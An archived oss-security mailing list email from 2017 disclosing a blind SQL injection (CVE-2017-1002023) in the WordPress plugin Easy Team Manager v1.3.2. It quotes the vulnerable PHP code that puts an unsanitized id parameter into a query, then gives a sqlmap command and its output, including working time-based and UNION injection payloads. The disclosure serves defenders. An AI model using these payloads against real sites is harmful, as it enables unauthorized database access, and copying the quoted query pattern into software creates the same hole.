X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3047" "Tuesday" "30" "May" "2017" "18:46:16" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<C80A5E87-D9AD-4798-B878-57CA4A939759@me.com>" "66" "[oss-security] Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2" nil nil nil "5" "2017053022:46:16" "[oss-security] Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2" (number mark "U       larry0@me.co May 30   66/3047  " thread-indent "\"[oss-security] Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5620 invoked by uid 550); 30 May 2017 22:46:32 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5555 invoked from network); 30 May 2017 22:46:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1496184378; bh=RO9RUJBgRqRs8cyZpaxD0AZ8pSsYIe/e2/EUfuBsxp8=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=EDAEBCkl/Z60F/Yk7KyPjkUTdyPiqTuSHgyIRZMtMO2TZgyq0b9cY4w23pyT7l4qV
 hflwN4isyhmh+IFXyQP73BPFwlN7xRZC10WEeUzPp3EL+kfCDgXiM1V1PjBIINdu7k
 xbGcnAxaUww1sN8s7EKMdCAHtLVYcE5TIWoGwTsF71wOJcTMdo+nDOqY0Ibr5Hqriz
 Htjd3DF00ZY+dxpoRGistZjqxBt4y1W+Aw4CtVWNKdNP+57H6teE4i4zPa0wzXk5K5
 tTBRN3u9mhjxmoRC700UV6ZT0ocLrfQhJHkt+SJsF/EyFWMKFkQ/k6O4uU+g8EU7vm
 gLzeReB3sIfXA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-05-30_14:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1705300413
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <C80A5E87-D9AD-4798-B878-57CA4A939759@me.com>
Date: Tue, 30 May 2017 18:46:16 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2

Title: Blind SQL Injection in Wordpress Plugin Easy Team Manager v1.3.2
Author: Larry W. Cashdollar, @_larry0
Date: 2017-05-24
CVE-ID:[CVE-2017-1002023]
Download Site: https://wordpress.org/plugins/easy-team-manager/
Vendor: https://daisythemes.com/
Vendor Notified: 2017-05-24
Vendor Contact: web form contact
Advisory: http://www.vapidlabs.com/advisory.php?v=3D194
Description: Easy Team Manager helps you to create team members with their =
short descriptions, social profiles link with smooth hover effects.
Vulnerability:
The following code does not sanitize $_GET['id'] before making it part of a=
n SQL statement in file ./easy-team-manager/inc/easy_team_manager_desc_edit=
.php:

85-        global $wpdb;=09
86-        $easy_team_manager_desc =3D $wpdb->get_results("SELECT *from ".$=
wpdb->prefix."easy_team_manager_description where id=3D".$_GET['id']);
87-		foreach ($easy_team_manager_desc as $s ){
88-			$ind_name_detail =3D unserialize($s->name);
89-			$socia_media =3D unserialize($s->social_media);
90:			$id=3D$_GET['id'];
91-			$ind_position =3D esc_attr($s->position);
92-			$ind_image=3D$s->image;
93-			$ind_email_detail =3D unserialize($s->email);
94-			$ind_phone_detail =3D unserialize($s->phone);
95-			$ind_desc =3D esc_attr(stripcslashes($s->ind_description));

This allows blind SQL injection via the id parameter by an authenticated us=
er with edit team priveledges.=20

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-admin/admin.php?pag=
e=3Deasy_team_manager_edit&id=3D*' --load-cookies=3D./cookies.txt --level=
=3D4 --risk=3D3 --dbms=3Dmysql
	=E2=80=A2=20=20
	=E2=80=A2 [08:39:09] [INFO] URI parameter '#1*' is 'MySQL UNION query (84)=
 - 1 to 20 columns' injectable
	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
he others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 3115 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* (URI)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
page=3Deasy_team_manager_edit&id=3D(CASE WHEN (3623=3D3623) THEN SLEEP(5) E=
LSE 3623 END)
	=E2=80=A2     Type: UNION query
	=E2=80=A2     Title: MySQL UNION query (84) - 5 columns
	=E2=80=A2     Payload: http://example.com:80/wordpress/wp-admin/admin.php?=
page=3Deasy_team_manager_edit&id=3D-5307 UNION ALL SELECT 84,CONCAT(0x71707=
87a71,0x58795a426e467457726744686879446f4e4d7a576a464758516e676552654953627=
9426759527443,0x7178787171),84,84,84#
	=E2=80=A2 ---
	=E2=80=A2 [08:39:15] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology
	=E2=80=A2 : Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [08:39:15] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 08:39:15=
